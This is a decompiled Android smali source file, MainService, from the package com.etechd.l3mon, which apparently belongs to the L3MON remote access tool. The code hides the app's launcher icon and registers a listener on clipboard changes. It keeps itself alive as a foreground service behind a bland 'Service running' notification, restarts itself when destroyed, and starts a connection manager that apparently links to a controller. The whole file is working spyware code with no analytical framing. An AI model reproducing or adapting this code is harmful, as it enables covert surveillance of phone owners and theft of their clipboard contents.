.class public Lcom/etechd/l3mon/MainService;
.super Landroid/app/Service;
.source "MainService.java"


# static fields
.field private static contextOfApplication:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 25
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 27
    return-void
.end method

.method public static getContextOfApplication()Landroid/content/Context;
    .locals 1

    .line 82
    sget-object v0, Lcom/etechd/l3mon/MainService;->contextOfApplication:Landroid/content/Context;

    return-object v0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .line 33
    const/4 v0, 0x0

    return-object v0
.end method

.method public onDestroy()V
    .locals 2

    .line 76
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 77
    new-instance v0, Landroid/content/Intent;

    const-string v1, "respawnService"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainService;->sendBroadcast(Landroid/content/Intent;)V

    .line 78
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 13
    .param p1, "paramIntent"    # Landroid/content/Intent;
    .param p2, "paramInt1"    # I
    .param p3, "paramInt2"    # I

    .line 39
    invoke-virtual {p0}, Lcom/etechd/l3mon/MainService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    .line 40
    .local v0, "pkg":Landroid/content/pm/PackageManager;
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/etechd/l3mon/MainActivity;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v2, 0x1

    const/4 v3, 0x2

    invoke-virtual {v0, v1, v3, v2}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 44
    new-instance v1, Lcom/etechd/l3mon/MainService$1;

    invoke-direct {v1, p0}, Lcom/etechd/l3mon/MainService$1;-><init>(Lcom/etechd/l3mon/MainService;)V

    .line 65
    .local v1, "mPrimaryChangeListener":Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;
    const-string v3, "clipboard"

    invoke-virtual {p0, v3}, Lcom/etechd/l3mon/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/content/ClipboardManager;

    .line 66
    .local v3, "clipboardManager":Landroid/content/ClipboardManager;
    invoke-virtual {v3, v1}, Landroid/content/ClipboardManager;->addPrimaryClipChangedListener(Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;)V

    .line 69
    sput-object p0, Lcom/etechd/l3mon/MainService;->contextOfApplication:Landroid/content/Context;

    sget v12, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v11, 0x1a

    if-lt v12, v11, :no_channel

    const-string v11, "l3mon_channel"

    const v12, 0x7f060000

    invoke-virtual {p0, v12}, Lcom/etechd/l3mon/MainService;->getString(I)Ljava/lang/String;

    move-result-object v12

    const/4 v4, 0x2

    new-instance v5, Landroid/app/NotificationChannel;

    invoke-direct {v5, v11, v12, v4}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const-string v4, "notification"

    invoke-virtual {p0, v4}, Lcom/etechd/l3mon/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/app/NotificationManager;

    invoke-virtual {v4, v5}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    new-instance v6, Landroid/app/Notification$Builder;

    invoke-direct {v6, p0, v11}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const v7, 0x7f050000

    invoke-virtual {v6, v7}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    const v7, 0x7f060000

    invoke-virtual {p0, v7}, Lcom/etechd/l3mon/MainService;->getString(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    const-string v7, "Service running"

    invoke-virtual {v6, v7}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    invoke-virtual {v6}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v7

    invoke-virtual {p0, v2, v7}, Lcom/etechd/l3mon/MainService;->startForeground(ILandroid/app/Notification;)V

    goto :fg_done

    :no_channel
    new-instance v6, Landroid/app/Notification$Builder;

    invoke-direct {v6, p0}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    const v7, 0x7f050000

    invoke-virtual {v6, v7}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    const v7, 0x7f060000

    invoke-virtual {p0, v7}, Lcom/etechd/l3mon/MainService;->getString(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    const-string v7, "Service running"

    invoke-virtual {v6, v7}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    invoke-virtual {v6}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v7

    invoke-virtual {p0, v2, v7}, Lcom/etechd/l3mon/MainService;->startForeground(ILandroid/app/Notification;)V

    :fg_done

    .line 70


    invoke-static {p0}, Lcom/etechd/l3mon/ConnectionManager;->startAsync(Landroid/content/Context;)V

    .line 71
    return v2
.end method
